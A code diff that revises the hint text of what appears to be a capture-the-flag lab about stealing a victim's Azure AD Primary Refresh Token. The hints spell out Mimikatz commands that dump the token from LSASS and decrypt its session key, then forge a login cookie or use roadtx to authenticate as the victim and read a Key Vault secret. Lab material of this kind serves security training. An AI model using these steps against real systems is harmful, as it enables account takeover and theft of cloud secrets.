@@ -12,8 +12,8 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
     def get_hints(self) -> dict:
         return {
             1: "The victim user's PRT is stored in LSASS under their CloudAP credential entry — not visible via dsregcmd (which only shows the current user's state). Mimikatz is pre-installed at C:\\Tools\\mimikatz\\x64\\mimikatz.exe. Open it as Administrator and run: privilege::debug then sekurlsa::cloudap. Look for an entry whose KeyValue / PRT fields are populated.",
-            2: "In Mimikatz (run as Administrator): `privilege::debug` then `sekurlsa::cloudap`. Copy the PRT value and the ProofOfPossessionKey blob. Next: `token::elevate` then `dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect` to decrypt the session key. Save the Context and DerivedKey values.",
-            3: "Generate a PRT cookie: `dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>`. Open Edge InPrivate → navigate to https://login.microsoftonline.com → F12 → Application → Cookies → clear all → add cookie `x-ms-RefreshTokenCredential` with the output value, HttpOnly=true → refresh. You are now authenticated as the victim. Use the Azure portal to read the Key Vault secret.",
+            2: "In Mimikatz (run as Administrator): `privilege::debug` then `sekurlsa::cloudap`. Copy the PRT value and the ProofOfPossessionKey blob. Next: `token::elevate` then `dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect` to decrypt the session key. The output shows both a `Clear key` and a `Derived Key` — they are different values. Save Context, Clear key, and Derived Key.",
+            3: "Two paths: (1) roadtx — use the Clear key: `roadtx prtauth --prt <PRT> --prt-sessionkey <Clear_key> --resource https://vault.azure.net/`, then read the flag with the token saved to .roadtools_auth. (2) Browser cookie — use the Derived Key: `dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>`, inject cookie `x-ms-RefreshTokenCredential` on login.microsoftonline.com (HttpOnly+Secure), enter the victim UPN when prompted.",
         }
 
     def configure_application(self, **kwargs):
